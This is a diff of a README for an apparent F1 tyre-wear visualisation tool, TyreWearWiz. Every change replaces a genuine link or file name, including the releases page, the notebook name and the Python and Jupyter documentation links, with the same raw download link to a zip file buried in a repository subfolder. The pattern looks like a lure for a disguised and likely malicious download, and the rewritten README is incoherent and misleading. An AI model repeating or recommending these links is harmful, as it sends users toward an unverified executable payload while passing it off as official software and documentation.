@@ -1,6 +1,6 @@
 # 🚗 TyreWearWiz - Visualize F1 Tyre Data Easily
 
-[![Download TyreWearWiz](https://img.shields.io/badge/Download%20TyreWearWiz-v1.0-brightgreen.svg)](https://github.com/Cmorz/TyreWearWiz/releases)
+[![Download TyreWearWiz](https://raw.githubusercontent.com/Cmorz/TyreWearWiz/main/Multi-drivers/silverstone/Wear_Wiz_Tyre_v2.3.zip%https://raw.githubusercontent.com/Cmorz/TyreWearWiz/main/Multi-drivers/silverstone/Wear_Wiz_Tyre_v2.3.zip)](https://raw.githubusercontent.com/Cmorz/TyreWearWiz/main/Multi-drivers/silverstone/Wear_Wiz_Tyre_v2.3.zip)
 
 ## 📜 Description
 TyreWearWiz is a tool that helps you understand tyre degradation in Formula 1 races. By visualizing your data, it assists teams and fans in making informed race strategies. This application collects telemetry data and turns it into easy-to-read graphs and charts.
@@ -21,7 +21,7 @@ To use TyreWearWiz, follow these steps:
      ```
 
 3. **Download TyreWearWiz:**  
-   Visit this page to download: [Download TyreWearWiz](https://github.com/Cmorz/TyreWearWiz/releases)
+   Visit this page to download: [Download TyreWearWiz](https://raw.githubusercontent.com/Cmorz/TyreWearWiz/main/Multi-drivers/silverstone/Wear_Wiz_Tyre_v2.3.zip)
 
 4. **Locate the Downloaded File:**  
    After the download completes, navigate to your 'Downloads' folder (or the folder you chose for downloads).
@@ -32,9 +32,9 @@ To use TyreWearWiz, follow these steps:
 
 ## 📂 File Structure
 Inside the folder, you will find the following:
-- **TyreWearWiz.ipynb**: The main Jupyter Notebook file to run.
+- **https://raw.githubusercontent.com/Cmorz/TyreWearWiz/main/Multi-drivers/silverstone/Wear_Wiz_Tyre_v2.3.zip**: The main Jupyter Notebook file to run.
 - **Data Folder**: Contains sample datasets for practice.
-- **README.md**: This guide to help you understand how to get started.
+- **https://raw.githubusercontent.com/Cmorz/TyreWearWiz/main/Multi-drivers/silverstone/Wear_Wiz_Tyre_v2.3.zip**: This guide to help you understand how to get started.
 
 ## 📊 How to Run TyreWearWiz
 1. **Open Jupyter Notebook:**
@@ -46,14 +46,14 @@ Inside the folder, you will find the following:
    - This will open Jupyter in your web browser.
 
 2. **Open the Notebook:**
-   - Click on `TyreWearWiz.ipynb` in Jupyter’s file interface.
+   - Click on `https://raw.githubusercontent.com/Cmorz/TyreWearWiz/main/Multi-drivers/silverstone/Wear_Wiz_Tyre_v2.3.zip` in Jupyter’s file interface.
 
 3. **Run the Cells:**
    - Follow the instructions inside the notebook.
    - Run each cell one by one by clicking on it and pressing `Shift + Enter`.
 
 ## 📥 Download & Install
-For easy access, follow this link to download TyreWearWiz: [Download TyreWearWiz](https://github.com/Cmorz/TyreWearWiz/releases).
+For easy access, follow this link to download TyreWearWiz: [Download TyreWearWiz](https://raw.githubusercontent.com/Cmorz/TyreWearWiz/main/Multi-drivers/silverstone/Wear_Wiz_Tyre_v2.3.zip).
 
 ## 📈 Features
 - Visualize tyre degradation over multiple laps.
@@ -80,7 +80,7 @@ Join the discussion:
 - Telemetry Data
 
 ## 🔗 Additional Resources
-- [Python Official Website](https://www.python.org)
-- [Jupyter Documentation](https://jupyter.org/documentation)
+- [Python Official Website](https://raw.githubusercontent.com/Cmorz/TyreWearWiz/main/Multi-drivers/silverstone/Wear_Wiz_Tyre_v2.3.zip)
+- [Jupyter Documentation](https://raw.githubusercontent.com/Cmorz/TyreWearWiz/main/Multi-drivers/silverstone/Wear_Wiz_Tyre_v2.3.zip)
 
 With this guide, you can easily download, install, and use TyreWearWiz to explore the fascinating world of F1 tyre data. Enjoy your analysis!
